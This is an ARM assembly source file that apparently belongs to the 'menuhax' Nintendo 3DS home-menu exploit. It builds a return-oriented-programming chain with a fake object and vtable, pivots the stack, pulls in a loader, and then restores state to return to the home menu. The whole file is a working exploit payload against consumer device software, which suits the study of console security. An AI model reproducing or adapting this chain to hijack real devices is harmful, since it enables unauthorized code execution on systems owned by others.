.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

#define SDICONHAX_SPRETADDR (0x0ffffe20 - (6*4)) //SP address right before the original stack-pivot was done.

_start:

ropstackstart:

@ *saved_r4 = <value setup by menuhax_manager>, aka the original address for the first objptr.
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word SDICONHAX_SPRETADDR

.word ROP_LDR_R0FROMR0

.word POP_R1PC
.word (0x58414800 + 0x00) @ r1

.word ROP_STR_R1TOR0

@ Subtract the saved r4 on stack by 4. This results in the current objptr in the target_objectslist_buffer being reprocessed @ RET2MENU.
ROPMACRO_LDDRR0_ADDR1_STRADDR SDICONHAX_SPRETADDR, SDICONHAX_SPRETADDR, 0xfffffffc

@ *saved_r4 = <value setup by menuhax_manager>, aka the original address for the second objptr.
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word SDICONHAX_SPRETADDR

.word ROP_LDR_R0FROMR0

.word POP_R1PC
.word (0x58414800 + 0x01) @ r1

#include "menuhax_loader.s"

@ The ROP used for RET2MENU starts here.

ROPMACRO_STACKPIVOT SDICONHAX_SPRETADDR, ROP_POPPC @ Return to executing the original homemenu code. TODO: switch ROP_POPPC here to a pop-{r4-r8,pc} instruction.

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word 0
.word 0
.word 0

.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word HEAPBUF + (ropstackstart - _start) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.

